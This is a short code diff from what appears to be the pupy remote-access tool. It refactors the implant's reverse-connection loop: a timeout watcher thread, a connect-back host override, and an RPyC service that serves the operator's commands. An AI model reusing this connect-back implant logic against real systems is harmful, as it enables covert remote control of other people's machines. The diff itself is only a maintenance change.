@@ -146,8 +146,6 @@ def get_next_wait(attempt):
     else:
         return random.randint(150,300)/10.0
 
-
-
 def set_connect_back_host(HOST):
     import pupy
     pupy.get_connect_back_host=(lambda: HOST)
@@ -212,17 +210,13 @@ def rpyc_loop(launcher):
                     s.start()
                 else: # connect payload
                     stream=ret
+
                     def check_timeout(event, cb, timeout=60):
-                        start_time=time.time()
-                        while True:
-                            if time.time()-start_time>timeout:
-                                if not event.is_set():
-                                    logging.error("timeout occured !")
-                                    cb()
-                                break
-                            elif event.is_set():
-                                break
-                            time.sleep(0.5)
+                        time.sleep(timeout)
+                        if not event.is_set():
+                            logging.error("timeout occured !")
+                            cb()
+
                     event=threading.Event()
                     t=threading.Thread(target=check_timeout, args=(event, stream.close))
                     t.daemon=True
@@ -231,9 +225,8 @@ def rpyc_loop(launcher):
                         conn=rpyc.utils.factory.connect_stream(stream, ReverseSlaveService, {})
                     finally:
                         event.set()
-                    while not stream.closed:
-                        attempt=0
-                        conn.serve(0.01)
+                    attempt=0
+                    conn.serve_all()
             except KeyboardInterrupt:
                 raise
             except EOFError:
